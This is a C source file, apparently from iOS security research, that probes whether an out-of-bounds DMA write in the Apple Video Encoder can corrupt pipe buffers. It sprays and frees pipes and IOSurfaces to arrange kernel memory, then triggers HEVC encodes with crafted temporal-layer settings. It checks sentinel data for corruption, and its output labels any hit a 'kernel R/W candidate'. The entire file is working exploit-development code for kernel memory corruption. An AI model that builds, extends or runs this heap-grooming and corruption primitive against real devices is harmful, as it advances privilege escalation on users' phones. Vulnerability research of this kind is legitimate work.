/*
 * ave_pipe_probe.c — DMA OOB → Pipe Buffer Corruption Probe
 *
 * Tests whether AVE DMA OOB writes can corrupt pipe buffer pages that
 * are physically adjacent to the DMA output buffer. Pipe buffers come
 * from the same page allocator as IOSurface/kmem_alloc pages, so DMA
 * overflow can reach them despite kalloc type isolation.
 *
 * If a pipe's backing page is corrupted, read()/write() on that pipe fd
 * operates on the corrupted data, potentially giving kernel R/W.
 *
 * Build:
 *   xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
 *     -framework VideoToolbox -framework CoreVideo -framework CoreMedia \
 *     -framework CoreFoundation -framework IOSurface -framework IOKit \
 *     -o ave_pipe_probe ave_pipe_probe.c -Wno-deprecated-declarations
 *
 * Deployed as: AVEPipe.app (com.research.avepipe)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/sysctl.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <signal.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>

typedef struct __IOSurface *IOSurfaceRef;
typedef uint32_t IOSurfaceID;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef surface);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef surface);
extern void IOSurfaceSetValue(IOSurfaceRef surface, CFStringRef key, CFTypeRef value);
extern CFTypeRef IOSurfaceCopyValue(IOSurfaceRef surface, CFStringRef key);

static FILE *out;
static volatile int g_signal = 0;
static void sig_handler(int sig) { g_signal = sig; }

static void p(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt); vfprintf(out, fmt, ap); va_end(ap); fflush(out);
}

#define PIPE_COUNT    512
#define HOLE_STRIDE   4
#define SENTINEL_SIZE 4096
#define IOSURFACE_COUNT 256

static int g_pipes[PIPE_COUNT][2];
static IOSurfaceRef g_surfaces[IOSURFACE_COUNT];

static uint32_t sentinel_word(int idx) {
    return 0xDEAD0000u | (uint16_t)idx;
}

static int fill_pipe_sentinel(int fd, int idx) {
    uint32_t buf[SENTINEL_SIZE / sizeof(uint32_t)];
    uint32_t word = sentinel_word(idx);
    for (int i = 0; i < (int)(sizeof(buf) / sizeof(buf[0])); i++)
        buf[i] = word;
    int flags = fcntl(fd, F_GETFL);
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);
    ssize_t n = write(fd, buf, sizeof(buf));
    fcntl(fd, F_SETFL, flags);
    return (int)n;
}

static int check_pipe_sentinel(int fd, int idx) {
    uint32_t buf[SENTINEL_SIZE / sizeof(uint32_t)];
    memset(buf, 0, sizeof(buf));
    int flags = fcntl(fd, F_GETFL);
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);
    ssize_t n = read(fd, buf, sizeof(buf));
    fcntl(fd, F_SETFL, flags);
    if (n <= 0) return -1;
    uint32_t expected = sentinel_word(idx);
    int corrupted = 0;
    for (int i = 0; i < (int)(n / (ssize_t)sizeof(uint32_t)); i++) {
        if (buf[i] != expected) {
            if (corrupted == 0)
                p("  !! PIPE[%d] CORRUPTED at word %d: expected 0x%08x got 0x%08x\n",
                  idx, i, expected, buf[i]);
            corrupted++;
        }
    }
    if (corrupted > 1)
        p("  !! PIPE[%d] total corrupted words: %d / %d\n",
          idx, corrupted, (int)(n / (ssize_t)sizeof(uint32_t)));
    return corrupted;
}

static void encode_cb(void *ref, void *buf, OSStatus st,
                       VTEncodeInfoFlags flags, CMSampleBufferRef sb) {
    (*(int *)ref)++;
}

static int do_encode(int ntl, int frames, uint8_t pixel_fill) {
    p("  Encoding: NTL=%d frames=%d fill=0x%02x\n", ntl, frames, pixel_fill);
    CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iop = CFDictionaryCreate(
        kCFAllocatorDefault, NULL, NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
    CFRelease(iop);
    int pixfmt = kCVPixelFormatType_32BGRA;
    CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pixfmt);
    CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn); CFRelease(fn);

    int cb = 0;
    VTCompressionSessionRef sess = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
        NULL, sa, NULL, encode_cb, &cb, &sess);
    CFRelease(sa);
    if (st || !sess) { p("  Encode create failed: %d\n", (int)st); return -1; }

    VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
    CFNumberRef n; int v;
    v = 1; n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v);
    VTSessionSetProperty(sess, CFSTR("EncoderUsage"), n); CFRelease(n);
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
    VTSessionSetProperty(sess, CFSTR("NumberOfTemporalLayers"), n); CFRelease(n);

    st = VTCompressionSessionPrepareToEncodeFrames(sess);
    if (st) { VTCompressionSessionInvalidate(sess); CFRelease(sess); return -1; }

    CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(sess);
    if (!pool) { VTCompressionSessionInvalidate(sess); CFRelease(sess); return -2; }

    for (int i = 0; i < frames; i++) {
        if (g_signal) break;
        CVPixelBufferRef pb = NULL;
        CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
        if (!pb) break;
        CVPixelBufferLockBaseAddress(pb, 0);
        void *base = CVPixelBufferGetBaseAddress(pb);
        if (base) memset(base, pixel_fill, CVPixelBufferGetDataSize(pb));
        CVPixelBufferUnlockBaseAddress(pb, 0);
        st = VTCompressionSessionEncodeFrame(sess, pb, CMTimeMake(i, 30), CMTimeMake(1, 30), NULL, NULL, NULL);
        CVPixelBufferRelease(pb);
        if (st) break;
    }
    VTCompressionSessionCompleteFrames(sess, kCMTimeInvalid);
    p("  Callbacks: %d\n", cb);
    VTCompressionSessionInvalidate(sess); CFRelease(sess);
    return cb;
}

static IOSurfaceRef create_filler_surface(int idx) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int w = 64, h = 64, bpr = 256, alloc = 16384, fmt = 0x42475241;
    CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &w);
    CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &h);
    CFNumberRef nbpr = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpr);
    CFNumberRef nalloc = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &alloc);
    CFNumberRef nfmt = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &fmt);
    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nw);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nh);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nbpr);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nalloc);
    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nfmt);
    CFRelease(nw); CFRelease(nh); CFRelease(nbpr); CFRelease(nalloc); CFRelease(nfmt);
    IOSurfaceRef surf = IOSurfaceCreate(props);
    CFRelease(props);
    return surf;
}

static void spray_and_test(int ntl, uint8_t fill) {
    p("Phase 1: Creating %d pipe pairs with sentinel data\n", PIPE_COUNT);
    int created = 0;
    for (int i = 0; i < PIPE_COUNT; i++) {
        g_pipes[i][0] = g_pipes[i][1] = -1;
        if (pipe(g_pipes[i]) == 0) {
            fill_pipe_sentinel(g_pipes[i][1], i);
            created++;
        }
    }
    p("  Created %d pipe pairs\n", created);

    p("Phase 2: Freeing every %dth pipe pair (creating holes)\n", HOLE_STRIDE);
    int freed = 0;
    for (int i = 0; i < PIPE_COUNT; i += HOLE_STRIDE) {
        if (g_pipes[i][0] >= 0) {
            close(g_pipes[i][0]); close(g_pipes[i][1]);
            g_pipes[i][0] = g_pipes[i][1] = -1;
            freed++;
        }
    }
    p("  Freed %d pipe pairs\n", freed);

    p("Phase 3: Triggering AVE encode with NTL=%d\n", ntl);
    do_encode(ntl, 5, fill);
    usleep(200000);

    p("Phase 4: Checking pipe sentinels for corruption\n");
    int ok = 0, bad = 0, miss = 0;
    for (int i = 0; i < PIPE_COUNT; i++) {
        if (g_pipes[i][0] < 0) { miss++; continue; }
        int result = check_pipe_sentinel(g_pipes[i][0], i);
        if (result < 0) miss++;
        else if (result == 0) ok++;
        else bad++;
    }
    p("  Results: %d ok, %d CORRUPTED, %d freed/unreadable\n", ok, bad, miss);
    if (bad > 0) p("\n*** PIPE BUFFER CORRUPTION DETECTED ***\n");
    else p("  No corruption detected this round\n");

    for (int i = 0; i < PIPE_COUNT; i++) {
        if (g_pipes[i][0] >= 0) { close(g_pipes[i][0]); close(g_pipes[i][1]); }
    }
}

int main(int argc, char *argv[]) {
    signal(SIGBUS, sig_handler);
    signal(SIGSEGV, sig_handler);
    char path[1024];
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    const char *mode = (argc >= 2) ? argv[1] : "info";
    snprintf(path, sizeof(path), "%s/Documents/ave_pipe_%s.txt", home, mode);
    out = fopen(path, "w");
    if (!out) return 1;

    p("=== AVE Pipe Corruption Probe ===\nMode: %s\nPID: %d\n", mode, getpid());
    char buf[256]; size_t len;
    len = sizeof(buf); sysctlbyname("kern.osversion", buf, &len, NULL, 0);
    p("Build: %s\n", buf);
    len = sizeof(buf); sysctlbyname("hw.machine", buf, &len, NULL, 0);
    p("Machine: %s\n\n", buf);

    if (strcmp(mode, "info") == 0) {
        int pipebufsz = 0;
        len = sizeof(pipebufsz);
        if (sysctlbyname("kern.ipc.pipebuffersize", &pipebufsz, &len, NULL, 0) == 0)
            p("Pipe buffer size (sysctl): %d\n", pipebufsz);
        else
            p("Pipe buffer size: unavailable via sysctl\n");
        int fds[2];
        if (pipe(fds) == 0) {
            int sz = fcntl(fds[1], F_GETPIPE_SZ);
            p("Pipe capacity (F_GETPIPE_SZ): %d\n", sz);
            long ps = sysconf(_SC_PAGESIZE);
            p("Page size: %ld\n", ps);
            close(fds[0]); close(fds[1]);
        }
        uint64_t memsize = 0;
        len = sizeof(memsize);
        sysctlbyname("hw.memsize", &memsize, &len, NULL, 0);
        p("Physical memory: %llu MB\n", memsize / (1024 * 1024));
        p("\nModes:\n");
        p("  pipe_spray   - Spray pipes + verify sentinels (no encode)\n");
        p("  pipe_ntl9    - Spray + NTL=9 encode → check corruption\n");
        p("  pipe_ntl16   - Spray + NTL=16 encode → check corruption\n");
        p("  pipe_rw_test - Interleaved spray + corruption check + R/W test\n");

    } else if (strcmp(mode, "pipe_spray") == 0) {
        p("Spray-only test (no encode, verify sentinel setup)\n");
        int created = 0;
        for (int i = 0; i < PIPE_COUNT; i++) {
            g_pipes[i][0] = g_pipes[i][1] = -1;
            if (pipe(g_pipes[i]) == 0) {
                fill_pipe_sentinel(g_pipes[i][1], i);
                created++;
            }
        }
        p("  Created %d pipe pairs\n", created);
        int ok = 0, bad = 0;
        for (int i = 0; i < PIPE_COUNT; i++) {
            if (g_pipes[i][0] < 0) continue;
            int r = check_pipe_sentinel(g_pipes[i][0], i);
            if (r == 0) ok++; else bad++;
        }
        p("  Sentinel check: %d ok, %d bad (should be 0 bad)\n", ok, bad);
        for (int i = 0; i < PIPE_COUNT; i++)
            if (g_pipes[i][0] >= 0) { close(g_pipes[i][0]); close(g_pipes[i][1]); }

    } else if (strcmp(mode, "pipe_ntl9") == 0) {
        spray_and_test(9, 0xBB);

    } else if (strcmp(mode, "pipe_ntl16") == 0) {
        spray_and_test(16, 0xBB);

    } else if (strcmp(mode, "pipe_rw_test") == 0) {
        p("=== Interleaved Pipe + IOSurface Spray ===\n");
        p("Phase 1: Alternating IOSurface and pipe allocation\n");
        int pipes_ok = 0, surfs_ok = 0;
        for (int i = 0; i < IOSURFACE_COUNT; i++) {
            g_surfaces[i] = create_filler_surface(i);
            if (g_surfaces[i]) surfs_ok++;
            int pi = i * 2;
            if (pi < PIPE_COUNT) {
                g_pipes[pi][0] = g_pipes[pi][1] = -1;
                if (pipe(g_pipes[pi]) == 0) {
                    fill_pipe_sentinel(g_pipes[pi][1], pi);
                    pipes_ok++;
                }
            }
            if (pi + 1 < PIPE_COUNT) {
                g_pipes[pi+1][0] = g_pipes[pi+1][1] = -1;
                if (pipe(g_pipes[pi+1]) == 0) {
                    fill_pipe_sentinel(g_pipes[pi+1][1], pi + 1);
                    pipes_ok++;
                }
            }
        }
        p("  Created %d IOSurfaces, %d pipe pairs\n", surfs_ok, pipes_ok);

        p("Phase 2: Freeing every %dth IOSurface (holes for DMA buffer)\n", HOLE_STRIDE);
        int freed = 0;
        for (int i = 0; i < IOSURFACE_COUNT; i += HOLE_STRIDE) {
            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; freed++; }
        }
        p("  Freed %d IOSurfaces\n", freed);

        p("Phase 3: AVE encode NTL=9\n");
        do_encode(9, 5, 0xBB);
        usleep(200000);

        p("Phase 4: Checking pipes for corruption\n");
        int ok = 0, bad = 0, miss = 0;
        for (int i = 0; i < PIPE_COUNT; i++) {
            if (g_pipes[i][0] < 0) { miss++; continue; }
            int r = check_pipe_sentinel(g_pipes[i][0], i);
            if (r < 0) miss++;
            else if (r == 0) ok++;
            else {
                bad++;
                p("  CORRUPTED PIPE %d — attempting extended read\n", i);
                uint8_t extra[256];
                int flags = fcntl(g_pipes[i][0], F_GETFL);
                fcntl(g_pipes[i][0], F_SETFL, flags | O_NONBLOCK);
                ssize_t n = read(g_pipes[i][0], extra, sizeof(extra));
                fcntl(g_pipes[i][0], F_SETFL, flags);
                if (n > 0) {
                    p("  Extended read got %zd bytes: ", n);
                    for (int j = 0; j < (n > 32 ? 32 : (int)n); j++)
                        p("%02x ", extra[j]);
                    p("...\n");
                }
            }
        }
        p("  Results: %d ok, %d CORRUPTED, %d freed/unreadable\n", ok, bad, miss);
        if (bad > 0) p("\n*** PIPE CORRUPTION DETECTED — KERNEL R/W CANDIDATE ***\n");

        for (int i = 0; i < IOSURFACE_COUNT; i++)
            if (g_surfaces[i]) CFRelease(g_surfaces[i]);
        for (int i = 0; i < PIPE_COUNT; i++)
            if (g_pipes[i][0] >= 0) { close(g_pipes[i][0]); close(g_pipes[i][1]); }

    } else {
        p("Unknown mode: %s\n", mode);
    }

    if (g_signal) p("\nCaught signal %d\n", g_signal);
    p("\n=== Done ===\n");
    fclose(out);
    return 0;
}
